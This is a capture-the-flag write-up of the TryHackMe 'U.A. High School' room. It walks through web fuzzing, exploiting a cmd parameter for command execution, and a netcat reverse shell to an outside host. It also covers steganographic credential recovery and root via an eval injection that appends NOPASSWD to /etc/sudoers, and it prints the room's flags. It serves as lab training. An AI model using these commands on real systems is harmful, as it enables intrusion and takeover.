## **Room:** [U.A. High School](https://tryhackme.com/room/yueiua)
---
## **Task 1**
---
> **Prompt**
>
> >Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.

> >Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

> >Please allow the machine 3 - 5 minutes to fully boot.

Host: 10.201.88.240
---
## Walkthrough
Run an nmap scan:
```bash
nmap -sS -sV 10.201.88.240
```
Open ports: 22 and 80.

I used gobuster to look for hidden directories:
```bash
gobuster dir -u http://10.201.88.240 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Result: /assets and /server-status.

Because I couldn't find anything interesting at the root, I focused on /assets. I ran:
```bash
gobuster dir -u http://10.201.88.240/assets -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt
```
Result:
```text
/index.php            (Status: 200) [Size: 0]
/.htaccess            (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 0]
/styles.css           (Status: 200) [Size: 2943]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
/.htgroup             (Status: 403) [Size: 278]
/wp-forum.phps        (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.htuser              (Status: 403) [Size: 278]
/.ht                  (Status: 403) [Size: 278]
/.htc                 (Status: 403) [Size: 278]
```
The site uses index.php, but it didn't reveal anything useful in the browser. I fuzzed index.php for possible parameters:
```bash
ffuf -u 'http://10.201.88.240/assets/index.php?FUZZ=id'  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fs 0
```
Result: cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1]
This indicates we can run commands via http://10.201.88.240/assets/index.php?cmd=<command>.
Example:
```text
http://10.201.88.240/assets/index.php?cmd=whoami --> d3d3LWRhdGEK
```
I base64-decoded the response and got www-data.
And while exploring ls, there were image folder:
```bash
curl -s 'http://10.201.88.240/assets/index.php' -G --data-urlencode 'cmd=ls -al images' | base64 -d
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
```
I downloaded oneforall.jpg:
```bash
wget http://10.201.88.240/assets/images/oneforall.jpg
```
When I tried to open it, it didn’t work. exiftool and strings revealed something odd — the file metadata reported PNG, but it wasn’t a valid PNG.
```text
exiftool oneforall.jpg 
ExifTool Version Number         : 11.88
File Name                       : oneforall.jpg
Directory                       : .
File Size                       : 96 kB
File Modification Date/Time     : 2023:07:09 17:42:05+01:00
File Access Date/Time           : 2025:10:05 04:21:39+01:00
File Inode Change Date/Time     : 2025:10:05 04:20:55+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : PNG image did not start with IHDR
```
I examined the bytes:
```text
xxd -l 19 oneforall.jpg 
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 00        
```
The file signature (PNG header) did not match the internal structure, so I removed the first 8 bytes and reconstructed a JPEG-like header:
```bash
printf '\xFF\xD8' | cat - recovered.jpg > fixed.jpg
```
I was then able to get an image, but I couldn't find the hidden data at first. Following an online write-up "https://grish0111.medium.com/tryhackme-u-a-high-school-writeup-85237130a2c8". I used 
```bash
steghide extract -sf fixed.jpg
```
It prompted for a passphrase and I got stuck there for a while.
---
I used an online collection of reverse shell commands (https://www.revshells.com/) and used one via the cmd parameter:
Url: "10.201.88.240/assets/index.php?cmd=busybox nc 10.201.60.88 4000 -e sh"
and 
```bash
nc -lvnp 4000
Listening on 0.0.0.0 4000
Connection received on 10.201.88.240 58358
```
While navigating, I found passphrase.txt. Its contents were base64: QWxsbWlnaHRGb3JFdmVyISEhCg== --> AllmightForEver!!!
I also found a clue from the image:
```text
Corrupt JPEG data: 12 extraneous bytes before marker 0xdb
wrote extracted data to "creds.txt".
```
In creds.txt: "Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A"
I tried SSH-ing with deku:One?For?All_!!one1/A and successfully logged in as deku.
From the deku's account, I have found the first flag: THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
---
While exploring, I found /opt/NewCompnent/Feedback.sh:
```text
deku@ip-10-201-88-240:/$ cd opt/
deku@ip-10-201-88-240:/opt$ ls
NewComponent
deku@ip-10-201-88-240:/opt$ cd NewComponent/
deku@ip-10-201-88-240:/opt/NewComponent$ ls
feedback.sh
deku@ip-10-201-88-240:/opt/NewComponent$ cat feedback.sh 
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi

```
This script basically do: 
```text
Tries to block dangerous characters, then uses eval to echo the input and appends it to /var/log/feedback.txt.
```
So, I used the following input: deku 	ALL=NOPASSWD:ALL >> /etc/sudoers
This command is basically allows user deku to run any command with sudo without a password (NOPASSWD: ALL)
Using that, I was eventually able to gain root access. I navigated the filesystem as root and found the final flag: THM{Y0U_4r3_7h3_NUm83r_1_H3r0}